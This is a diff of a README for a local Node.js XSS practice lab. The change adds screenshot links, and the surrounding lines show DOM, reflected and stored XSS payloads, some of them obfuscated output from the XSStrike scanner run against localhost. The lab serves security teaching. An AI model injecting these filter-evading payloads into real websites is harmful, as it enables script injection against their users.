@@ -3,19 +3,21 @@ Most of the XSS labs online are based on PHP backend. So I developed three simpl
 
 ### DOM-based XSS
 **Payload** : ```alert(1)```
-![]() \
+![](https://raw.githubusercontent.com/Corbe30/Node-XSS-labs/main/images/dom-based-xss.png) 
 
 
 ### Reflected XSS
 **XSStrike Query** : python .\xsstrike.py -u "http://localhost:3000/?txt1=a" \
 **Generated Payload** : ```<HtmL%0aONpoiNtereNteR%0d=%0d[8].find(confirm)%0dx>```
-![]() \
+![](https://raw.githubusercontent.com/Corbe30/Node-XSS-labs/main/images/reflected-xss.png)
+![](https://raw.githubusercontent.com/Corbe30/Node-XSS-labs/main/images/reflected-xss-xsstrike.png)
 
 
 ### Stored XSS
 **XSStrike Query** : python .\xsstrike.py -u "http://localhost:3000/?txt1=a&txt2=a" -f default \
 **Generated Payload** : ```'"</Script><Html Onmouseover=(confirm)()//<imG/sRc=l oNerrOr=(prompt)() x>```
-![]() \
+![](https://raw.githubusercontent.com/Corbe30/Node-XSS-labs/main/images/stored-xss.png)
+![](https://raw.githubusercontent.com/Corbe30/Node-XSS-labs/main/images/stored-xss-xsstrike.png)
 
 
 
